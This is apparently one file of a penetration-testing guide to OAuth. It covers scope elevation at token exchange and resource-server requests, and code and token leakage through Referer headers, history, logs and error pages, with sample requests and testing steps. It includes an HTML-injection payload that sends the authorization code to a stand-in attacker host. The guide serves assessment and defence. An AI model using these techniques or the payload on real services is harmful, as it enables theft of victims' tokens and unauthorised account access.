# Scope Elevation and Token Leakage

This file covers two distinct problems that get grouped together because both result in an attacker ending up with more access than intended: (1) upgrading a legitimately-issued token's permissions beyond what the user approved, and (2) a properly-scoped code or token escaping into a place an attacker can read it.

---

# Part 1: Scope Elevation

## The Mechanism Being Attacked

From file 1, the `scope` parameter in the authorization request (`scope=openid email`) is what the user sees and approves on the consent screen, and it's supposed to be exactly what the resulting token is limited to. Scope elevation means getting the authorization server to issue (or honor) a token with a **broader** scope than the one the user actually consented to.

## Scope Upgrade: Authorization Code Flow

**Precondition:** The attacker registers their **own** legitimate client application with the OAuth provider — this is normal, self-service, and requires no special access. This matters because it gives the attacker full control over what their own client sends at the token-exchange step, a back-channel request a third party normally cannot touch.

**Step 1 — Attacker's client requests a narrow scope, and a victim approves it:**
```
GET /auth?client_id=ATTACKER_APP&redirect_uri=https://attacker-app.com/callback&response_type=code&scope=openid%20email&state=xyz HTTP/1.1
Host: auth.oauth-provider.com
```
- `scope=openid email` — deliberately narrow. The consent screen the victim sees will say only "this app wants your email address," something a victim is far more likely to approve than a request for full profile or write access.
- The victim approves, and the authorization server issues a `code` scoped to `openid email` only, per file 1's Step 3.

**Step 2 — At the token exchange, the attacker (who controls this backend request entirely) adds scopes the victim never saw:**
```
POST /token HTTP/1.1
Host: auth.oauth-provider.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=a1b2c3d4e5f6g7h8&redirect_uri=https://attacker-app.com/callback&client_id=ATTACKER_APP&client_secret=SECRET&scope=openid%20email%20profile
```
Line-by-line:
- `code=...` — the code issued in Step 1, legitimately obtained.
- `scope=openid email profile` — the attacker has appended `profile` here, a scope never shown to or approved by the victim in Step 1's consent screen.
- **The vulnerability:** if the authorization server's token endpoint does not re-validate this `scope` value against the scope that was actually recorded when the `code` was issued, and instead just accepts whatever scope is asked for at exchange time, it will issue a token good for `profile` access as well.

**Step 3 — Server response, if vulnerable:**
```json
{
  "access_token": "z0y9x8w7v6u5",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "openid email profile"
}
```
The attacker's application now holds a token that can pull profile data the victim was never asked to approve sharing.

**Why this specifically requires the attacker's own client application:** this exchange happens over the back channel (server-to-server), which a third party intercepting only browser traffic cannot touch. The attacker needs to control the code that *sends* the token request in order to add the extra `scope` value — which is exactly why registering an attacker-controlled OAuth client is the enabling step, not an optional extra.

## Scope Upgrade: Implicit Flow

Because the implicit flow (file 1, Flow 4) delivers the token directly to the browser with no back-channel exchange at all, an attacker who has stolen *any* valid access token (via any of the leakage methods in Part 2 below, or via the redirect_uri attacks in file 2) can attempt scope elevation directly from their own browser, no attacker-owned client application required this time:

```
GET /userinfo?scope=openid%20profile%20email HTTP/1.1
Host: resource.oauth-provider.com
Authorization: Bearer STOLEN_TOKEN
```

Line-by-line:
- `Authorization: Bearer STOLEN_TOKEN` — the stolen token, proving *some* level of prior authorization exists.
- `scope=openid profile email` — the attacker manually adds a broader scope parameter to this resource-server request, hoping the server will honor the *requested* scope rather than strictly enforcing the scope the token was actually minted with.
- **The vulnerability:** if the resource server checks only "is this a valid, unexpired token" and then honors whatever `scope` is passed on the request itself — rather than looking up what scope was originally granted for this specific token — the attacker gets extra data fields back that the original token was never meant to unlock.
- **Important limitation, and why it still matters:** this generally only succeeds if the requested scope doesn't exceed what was *ever* possible for that client application to be granted in the first place (i.e., you're expanding within the client's own registered scope ceiling, not creating access rights that never existed anywhere in the system) — but that's still a meaningful, exploitable escalation from what the victim actually consented to.

## Detecting Scope Validation Flaws — Testing Method

1. Complete a normal OAuth flow requesting a deliberately minimal scope and observe the resulting token's declared `scope` in the token response.
2. If you control a client application (register your own test app, which most providers allow self-service), repeat the token exchange request but add additional scope values not present in the original authorization request, and check whether the response's `scope` field reflects the added values.
3. If you don't control a client application, take any captured token and replay a resource-server request with an added `scope` query parameter or an expanded `Accept`/field-selection parameter, and compare the returned fields against what the original consent screen described.
4. Always compare what the **consent screen displayed to the user** against what the **resulting token can actually do** — a mismatch here is the finding, regardless of which technique produced it.

---

# Part 2: Token and Code Leakage

The authorization code and access token are the two most sensitive values in the entire OAuth exchange, and both can end up in places they were never meant to be, entirely independent of any flaw in the flow logic itself.

## Leakage via Referer Header

**Mechanism:** When a browser navigates from Page A to Page B by following a link, loading an image, or any similar cross-origin request, it may send Page A's full URL — including query string — in the `Referer` header of the request to Page B, unless Page A explicitly restricts this with a `Referrer-Policy` header or `rel="noreferrer"` attribute.

**Why this matters for OAuth specifically:** for the authorization *code* flow, the code arrives in the query string (`?code=...`), which *is* included in `Referer` by default in many browsers. If the callback page (`https://client-app.com/callback?code=...`) contains any outbound reference to a third-party resource — an embedded ad, an analytics pixel, a font loaded from a CDN, a social share widget — the browser may send:

```
GET /pixel.gif HTTP/1.1
Host: analytics-thirdparty.com
Referer: https://client-app.com/callback?code=SplxlOBeZQQYbYS6WxSbIA&state=af0ifjsldkj
```

Line-by-line:
- `Referer:` header carries the **entire** originating URL, including the live authorization `code` and `state`, to a completely unrelated third party — the analytics vendor, ad network, or CDN operator now has a copy of a value that, if used quickly enough (before it expires or is redeemed), can be exchanged for a session as the victim.
- This requires no attacker action against the victim at all — it's a passive leak that occurs simply because the callback page happens to load third-party content before or without stripping the query string.

**HTML injection variant (from file 2):** even without a full XSS vulnerability, if an attacker can inject a single HTML element into a page that the `redirect_uri` points to (or that the client eventually renders using data from the query string), a simple `<img src="https://evil-user.net">` is enough — the browser attempting to fetch that image sends its own `Referer` header containing the current page's full URL, exfiltrating the code without needing to execute any JavaScript at all. This is particularly relevant when CSP blocks script execution but doesn't block plain image loads.

**Note on the implicit flow:** because the token is delivered in the URL **fragment** (`#access_token=...`), it is *not* included in the `Referer` header by design — the fragment is stripped by the browser before constructing `Referer` for any subsequent navigation. This is one of very few things the fragment-based design of the implicit flow actually got right, and it's worth noting this distinction explicitly when writing up findings, since it means Referer-based leakage is a code-flow and query-string-token concern, not a fragment-token concern.

## Leakage via Browser History

**Mechanism:** Both the authorization request and the callback URL are stored in the browser's local history by default, since they're ordinary GET-navigated URLs. This applies to `code` (query string) and, notably, also to `access_token` when delivered via fragment (Flow 4) — fragments are stored in browser history even though they're not sent over the network to the server on load.

**Real-world impact scenarios:**
- Shared or public computers (library terminals, kiosks) where a subsequent user can open browser history and find a still-valid, unexpired code or token.
- Browser sync features that replicate history across a user's devices, potentially exposing tokens to a device the user considers less trusted.
- Browser extensions with history-read permissions, which may harvest tokens as a side effect of unrelated functionality.
- History displayed in autocomplete/address-bar suggestions, visible to anyone glancing at the screen shortly after login.

**Why short code/token lifetimes matter here:** this is precisely why authorization codes are designed to be single-use and short-lived (commonly 30–60 seconds) — it limits, but does not eliminate, the exploitation window for history-based leakage, since the history entry persists indefinitely even after the code itself has expired.

## Leakage via Server-Side Logs

**Mechanism:** Web servers, reverse proxies, load balancers, and application-level request loggers commonly log the full request line — including query strings — by default, for debugging and analytics purposes. Any component that logs `GET /callback?code=...` in plaintext creates a durable, often long-retained record of a value that was only ever meant to be single-use and momentary.

**Where this typically surfaces in an assessment:**
- Nginx/Apache access logs (default log formats include the full request path and query string).
- CDN and API gateway request logs (frequently shipped to third-party log-aggregation SaaS platforms, widening the exposure further).
- Application Performance Monitoring (APM) tools like New Relic or Datadog, which may capture full request URLs in transaction traces.
- Error-tracking tools (Sentry, Rollbar) that attach the current URL to every captured exception, including ones with no direct connection to the OAuth flow — a completely unrelated JS error thrown on the callback page can end up shipping the live code to an error-tracking dashboard.

**Why this is a code-flow concern more than a token-flow concern:** the code lands in a query string that the server necessarily sees and can log. The implicit flow's fragment-based token is never actually transmitted to the server at all (by design), so it cannot appear in *server-side* access logs the same way — though it remains fully exposed to *client-side* logging (browser extensions, JS error trackers reading `location.href`, which does include the fragment).

## Leakage via Error Messages

**Mechanism:** When something goes wrong mid-flow — an expired code is retried, a malformed request is sent, a downstream service times out — poorly designed error-handling code sometimes echoes the full failing request, including the sensitive parameter, back into an error page, a debug log visible to non-privileged staff, or a support ticket automatically generated from an exception trace.

**Example of what to look for:**
```
HTTP/1.1 500 Internal Server Error
Content-Type: text/html

<h1>Error processing request</h1>
<p>Failed to process: /callback?code=SplxlOBeZQQYbYS6WxSbIA&state=af0ifjsldkj</p>
<p>Stack trace: ...</p>
```

If this error page is served to the browser directly (not just logged server-side), it's a direct, network-visible leak; if it's only logged, it falls into the same server-side-logging concern above but often with weaker log-retention and access controls than "official" access logs, since debug/error logs are frequently treated as lower-sensitivity by ops teams.

## Consolidated Testing Approach for Leakage

1. Complete a full OAuth flow while proxying through Burp, and on the callback page specifically, check the **Referer** header of every subsequent outbound request the page makes (images, scripts, fonts, analytics beacons) — this is a five-minute check that regularly turns up findings.
2. Check the page's `Referrer-Policy` header (or lack of one) on the callback route specifically — `no-referrer` or `strict-origin` should be present; its absence combined with any third-party resource load is the finding.
3. Deliberately trigger error conditions during the flow (replay an already-used code, submit a malformed `redirect_uri`, let a token request time out) and inspect whatever error output is returned to the browser or, if you have visibility, written to logs.
4. If the client application has any client-side error tracking (visible via browser dev tools' Network tab — look for calls to Sentry, Bugsnag, LogRocket, etc. domains), check what data those tools are configured to capture from the callback page.

## Real-World Notes

- Referer-based OAuth code leakage to third-party ad/analytics networks has been a recurring, publicly disclosed bug bounty finding across major platforms — it's cheap to test and easy to miss, which is why it keeps appearing.
- Session-replay and heatmap tools (FullStory, Hotjar, LogRocket) embedded on callback pages are a frequently overlooked leakage vector, since they can capture the full page URL and sometimes even in-page content, by design, as part of normal operation rather than a bug in the tool itself — the bug is embedding them on a page carrying live secrets.
- The overall remediation direction across all of Part 2 is the same: never let a code or token sit in the query string of a page that loads any third-party content, keep code/token lifetimes as short as technically feasible, and treat `redirect_uri` callback routes as sensitive-data routes for logging purposes — scrub or omit the query string in any log line by default rather than by exception.

## What Comes Next

File 5 uses the CSRF/linking mechanics from file 3 and the credential-trust assumptions underlying OAuth authentication to build full account-takeover chains — including the "pre-account-takeover" pattern where an attacker registers first, before the victim ever uses OAuth login at all.
